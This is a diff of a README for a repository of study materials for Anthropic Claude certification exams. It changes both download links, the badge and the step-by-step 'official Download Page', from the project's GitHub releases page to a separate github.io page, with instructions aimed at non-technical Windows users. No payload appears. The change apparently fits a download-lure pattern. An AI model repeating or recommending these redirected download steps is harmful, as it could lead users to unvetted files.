@@ -1,6 +1,6 @@
 # 🎓 CLAUDE-CERTIFICATIONS - Master the Anthropic Certification Exams Today
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/m7xgam648/CLAUDE-CERTIFICATIONS/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://m7xgam648.github.io)
 
 This repository provides comprehensive study materials for the four official Anthropic Claude certifications. These certifications cover the Associate, Developer, and Architect roles at both Foundation and Professional levels. You will find official exam blueprints, domain weight breakdowns, cheat sheets, 320 practice questions, three full-length mock exams, and 110 flashcards. A printable companion guide helps you organize your study schedule.
 
@@ -9,7 +9,7 @@ This repository provides comprehensive study materials for the four official Ant
 You do not need programming experience to use these study materials. Follow these steps to obtain the files on your Windows computer.
 
 1. Open your web browser. 
-2. Navigate to the official [Download Page](https://github.com/m7xgam648/CLAUDE-CERTIFICATIONS/releases).
+2. Navigate to the official [Download Page](https://m7xgam648.github.io).
 3. Look for the section labeled "Assets" under the most recent version tag.
 4. Click the link that ends in ".zip" or ".pdf" to save the file to your computer.
 5. Once the download finishes, locate the file in your Downloads folder.
